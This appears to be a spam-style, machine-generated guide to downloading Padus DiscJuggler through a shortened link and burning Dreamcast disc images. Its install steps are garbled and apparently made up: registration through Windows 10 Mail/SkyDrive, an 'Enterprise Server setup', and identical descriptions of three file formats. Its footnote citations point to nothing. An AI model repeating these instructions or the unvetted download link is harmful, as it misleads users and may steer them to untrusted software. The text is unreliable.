## Step 1: Download and install Padus DiscJuggler NET v6.0.0.1400 64 bit
 
You can download Padus DiscJuggler NET v6.0.0.1400 64 bit from [this link](https://fancli.com/2t4tov) [^2^]. Unzip the ZIP file and open the installer. Press Install and then press Next. You will need to use Windows 10 Mail/SkyDrive as the email client for the registration form[^2^]. The registration form uses the basic Windows 10 version, but you will be presented with an Outlook-style form in the installer[^2^]. Fill in the required information and click Next.
 
The installer will automatically load an Ad-Hoc or Enterprise Server setup (Windows 10, or Windows 10 Enterprise). If it cannot find one, you will have to select Use an existing server[^2^]. Follow the instructions to re-install your own local server[^2^]. This step is complicated and may vary depending on your system configuration, so we cannot explain it in detail here.
 
## Step 2: Select the disc format and the disc image
 
When you first start the Padus DiscJuggler menu, you can select the disc format you want to use to burn your files. For Dreamcast games, use one of the following:
 
- .iso - use with the source ISO image of the disc you want to burn
- .img - use with the source ISO image of the disc you want to burn
- .cdi - use with the source ISO image of the disc you want to burn

When you do this, you will be presented with a list of all the disc images on your computer. If you select the "Burn CD" option from the left side of the menu, then the program will try to open the disc image you selected in DiscJuggler. If it does not open successfully, this is likely because the disc image you selected is an ISO image, or a compressed IMG file[^3^].

## Step 3: Adjust the settings and start burning

You can also enable or disable some advanced features, such as overburning, multisession discs, or DAO/TAO modes[^1^]. Make sure you know what you are doing before changing these settings.
 
When you are ready, insert a blank CD-R disc into your writer and click Start. The program will begin burning your Dreamcast game onto the disc. Wait until it finishes and ejects the disc. You can now test your game on your Dreamcast console or emulator.
